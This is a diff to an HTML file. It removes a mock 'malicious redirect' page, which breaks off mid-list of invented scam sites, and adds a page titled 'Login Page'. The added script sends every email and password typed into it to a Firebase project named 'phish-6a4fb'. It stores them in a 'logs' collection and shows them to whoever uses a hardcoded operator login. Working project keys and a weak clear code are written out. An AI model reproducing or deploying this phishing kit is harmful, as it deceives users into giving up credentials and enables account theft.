@@ -3,238 +3,138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Malicious Redirect Chain</title>
+    <title>Login Page</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #1a1a1a;
-            color: #ff0000;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             margin: 0;
-            padding: 0;
-            overflow: hidden;
         }
-        .malicious-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0,0,0,0.9);
-            z-index: 9999;
-            display: none;
-        }
-        .site-info {
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            background-color: #ff0000;
-            color: white;
-            padding: 15px;
-            border-radius: 5px;
-            z-index: 1000;
-        }
-        .malicious-popup {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: #fff;
-            color: #000;
+        .container {
+            background: white;
             padding: 20px;
-            border-radius: 5px;
-            z-index: 1001;
-            display: none;
-            box-shadow: 0 0 20px rgba(255,0,0,0.8);
-        }
-        .infection-meter {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            width: 200px;
-            height: 20px;
-            background-color: #333;
-            border: 2px solid #ff0000;
-            border-radius: 10px;
-            overflow: hidden;
-            z-index: 1000;
-        }
-        .infection-fill {
-            height: 100%;
-            background-color: #ff0000;
-            width: 0%;
-            transition: width 0.5s;
-        }
-        .warning-banner {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            background-color: #ff0000;
-            color: white;
-            padding: 10px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
             text-align: center;
-            z-index: 1002;
-            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        #logs {
+            margin-top: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+            border: 1px solid #ccc;
+            padding: 10px;
+            background-color: #f9f9f9;
+        }
+        #logs div {
+            margin-bottom: 10px;
         }
     </style>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
 </head>
 <body>
-    <div class="warning-banner">
-        🚨 MALICIOUS ACTIVITY DETECTED - SECURITY COMPROMISED 🚨
-    </div>
+    <div class="container">
+        <h2>Login</h2>
+        <input type="email" id="email" placeholder="Email" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button onclick="login()">Login</button>
 
-    <div class="site-info" id="siteInfo">
-        <div>🚨 MALICIOUS SITE #1 🚨</div>
-        <div>Auto-redirecting...</div>
-    </div>
-
-    <div class="infection-meter">
-        <div class="infection-fill" id="infectionFill"></div>
-    </div>
-
-    <div class="malicious-overlay" id="overlay"></div>
-    
-    <div class="malicious-popup" id="maliciousPopup">
-        <h3>🦠 VIRUS ALERT 🦠</h3>
-        <p>Your computer is infected!</p>
-        <button onclick="closePopup()">Ignore</button>
-        <button onclick="installFakeAntivirus()">Install Antivirus</button>
+        <h2>Logs</h2>
+        <input type="text" id="clearCode" placeholder="Enter 2002 to clear logs">
+        <button onclick="clearLogs()">Clear Logs</button>
+        <div id="logs"></div>
     </div>
 
     <script>
-        // Array of 40 malicious websites
-        const maliciousSites = [
-            {
-                url: "http://malware-distribution.com/virus",
-                title: "VIRUS DOWNLOAD CENTER",
-                behaviors: ["download_malware", "show_popup", "play_alarm"]
-            },
-            {
-                url: "http://phishing-bank.com/steal",
-                title: "BANK OF AMERICA - VERIFICATION",
-                behaviors: ["phishing_form", "redirect_chain", "clipboard_access"]
-            },
-            {
-                url: "http://tech-support-scam.net/alert",
-                title: "MICROSOFT SECURITY ALERT",
-                behaviors: ["fake_scan", "phone_number", "lock_screen"]
-            },
-            {
-                url: "http://crypto-miner.xyz/mine",
-                title: "CRYPTO MINER - EARN NOW",
-                behaviors: ["crypto_mining", "cpu_overload", "persistent_popup"]
-            },
-            {
-                url: "http://fake-antivirus.pro/scan",
-                title: "ANTIVIRUS PRO - FREE SCAN",
-                behaviors: ["fake_scan_results", "download_exe", "browser_hijack"]
-            },
-            {
-                url: "http://data-stealer.info/collect",
-                title: "SYSTEM OPTIMIZER",
-                behaviors: ["data_collection", "keylogger", "form_grabber"]
-            },
-            {
-                url: "http://ransomware.attack/encrypt",
-                title: "FILE ENCRYPTOR - SECURITY",
-                behaviors: ["fake_encrypt", "ransom_note", "countdown_timer"]
-            },
-            {
-                url: "http://adult-content.xyz/view",
-                title: "ADULT CONTENT - FREE ACCESS",
-                behaviors: ["porn_redirect", "tab_spam", "history_manipulation"]
-            },
-            {
-                url: "http://illegal-gambling.win/bet",
-                title: "ONLINE CASINO - WIN BIG",
-                behaviors: ["gambling_redirect", "payment_steal", "addiction_loop"]
-            },
-            {
-                url: "http://fake-news.today/breaking",
-                title: "BREAKING NEWS - SHOCKING",
-                behaviors: ["fake_news", "share_hijack", "notification_spam"]
-            },
-            {
-                url: "http://survey-scam.com/reward",
-                title: "SURVEY - WIN \$1000",
-                behaviors: ["survey_harvest", "email_spam", "redirect_loop"]
-            },
-            {
-                url: "http://dating-scam.net/match",
-                title: "HOT SINGLES NEAR YOU",
-                behaviors: ["dating_scam", "subscription_trap", "photo_steal"]
-            },
-            {
-                url: "http://weight-loss-scam.xyz/diet",
-                title: "LOSE 20LBS IN 1 WEEK",
-                behaviors: ["fake_product", "credit_card_steal", "auto_ship"]
-            },
-            {
-                url: "http://job-scare.com/apply",
-                title: "WORK FROM HOME - \$5000/MO",
-                behaviors: ["job_scam", "identity_theft", "phishing"]
-            },
-            {
-                url: "http://tax-scam.gov/refund",
-                title: "IRS - TAX REFUND PENDING",
-                behaviors: ["gov_impersonation", "ssn_steal", "bank_access"]
-            },
-            {
-                url: "http://social-media-hack.net/followers",
-                title: "GET 10000 INSTAGRAM FOLLOWERS",
-                behaviors: ["account_hack", "password_steal", "spam_post"]
-            },
-            {
-                url: "http://fake-charity.org/donate",
-                title: "HELP CHILDREN - DONATE NOW",
-                behaviors: ["charity_scam", "payment_theft", "emotional_manipulation"]
-            },
-            {
-                url: "http://software-pirate.warez/download",
-                title: "FREE SOFTWARE DOWNLOADS",
-                behaviors: ["warez_distribution", "malware_bundle", "crack_tools"]
-            },
-            {
-                url: "http://streaming-piracy.tv/movies",
-                title: "WATCH LATEST MOVIES FREE",
-                behaviors: ["piracy_redirect", "malware_stream", "popup_storm"]
-            },
-            {
-                url: "http://fake-store.shop/deals",
-                title: "LIMITED TIME OFFER - 90% OFF",
-                behaviors: ["fake_store", "credit_card_theft", "shipping_scam"]
-            },
-            {
-                url: "http://investment-scam.pro/bitcoin",
-                title: "BITCOIN DOUBLING SCHEME",
-                behaviors: ["investment_fraud", "crypto_theft", "pyramid_scheme"]
-            },
-            {
-                url: "http://phishing-email.net/verify",
-                title: "EMAIL VERIFICATION REQUIRED",
-                behaviors: ["email_hijack", "password_reset", "spam_forward"]
-            },
-            {
-                url: "http://fake-security.camera/hack",
-                title: "SECURITY CAMERA HACK TOOL",
-                behaviors: ["camera_hack", "privacy_violation", "blackmail_material"]
-            },
-            {
-                url: "http://dark-web.marketplace/drugs",
-                title: "DARK WEB MARKETPLACE",
-                behaviors: ["illegal_market", "crypto_payment", "law_enforcement_trap"]
-            },
-            {
-                url: "http://fake-passport.gov/apply",
-                title: "EXPRESS PASSPORT SERVICE",
-                behaviors: ["document_fraud", "identity_theft", "government_impersonation"]
-            },
-            {
-                url: "http://virus-removal.tool/clean",
-                title: "VIRUS REMOVAL TOOL",
-                behaviors: ["fake_removal", "system_damage", "data_corruption"]
-            },
-            {
-                url: "http://hack-facebook.com/account",
-                title: "FACEBOOK ACCOUNT HACKER",
-                behaviors: ["social_media_hack", "phishing
+        const firebaseConfig = {
+            apiKey: "AIzaSyAqFG75g9KyHh_IwP7ok6OyVMaOIG3aqP4",
+            authDomain: "phish-6a4fb.firebaseapp.com",
+            projectId: "phish-6a4fb",
+            storageBucket: "phish-6a4fb.firebasestorage.app",
+            messagingSenderId: "580853387084",
+            appId: "1:580853387084:web:b7e13ddcc56551bc4b49e9",
+            measurementId: "G-QLK709FFDL"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+
+        async function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            try {
+                await auth.signInWithEmailAndPassword(email, password);
+                if (email === 'code2002@gmail.com' && password === '2002') {
+                    showLogs();
+                } else {
+                    logCredential(email, password);
+                }
+            } catch (error) {
+                alert('Invalid email or password');
+            }
+        }
+
+        function logCredential(email, password) {
+            db.collection('logs').add({
+                email: email,
+                password: password,
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            });
+        }
+
+        function showLogs() {
+            db.collection('logs').get().then((querySnapshot) => {
+                const logsDiv = document.getElementById('logs');
+                logsDiv.innerHTML = '';
+                querySnapshot.forEach((doc) => {
+                    const log = doc.data();
+                    const logElement = document.createElement('div');
+                    logElement.textContent = `Email: ${log.email}, Password: ${log.password}`;
+                    logsDiv.appendChild(logElement);
+                    logsDiv.appendChild(document.createElement('hr'));
+                });
+            });
+        }
+
+        function clearLogs() {
+            const clearCode = document.getElementById('clearCode').value;
+            if (clearCode === '2002') {
+                db.collection('logs').get().then((querySnapshot) => {
+                    querySnapshot.forEach((doc) => {
+                        doc.ref.delete();
+                    });
+                });
+            } else {
+                alert('Invalid clear code');
+            }
+        }
+    </script>
+</body>
+</html>
